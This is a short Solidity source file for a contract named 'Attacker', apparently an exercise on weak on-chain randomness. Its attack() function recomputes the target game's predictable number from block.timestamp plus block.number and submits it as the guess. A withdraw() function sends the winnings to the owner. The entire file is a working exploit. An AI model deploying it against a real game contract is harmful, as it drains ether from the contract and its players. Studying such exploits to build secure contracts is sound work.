// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

interface IGame{
    function play(uint256 guess) external;
}

contract Attacker {

    address owner;
    

    IGame public game;  // store smart contract game address

    constructor(address GameAddress) payable{
        game = IGame(GameAddress);
        owner = msg.sender;
    }

    function attack() external{
         uint256 number= block.timestamp + block.number ;
         game.play(number);
     }

     function withdraw() external{
        require(msg.sender == owner , "not owner");
       payable(owner) .transfer(address(this).balance);
     }

     
     receive() external payable{}


    }

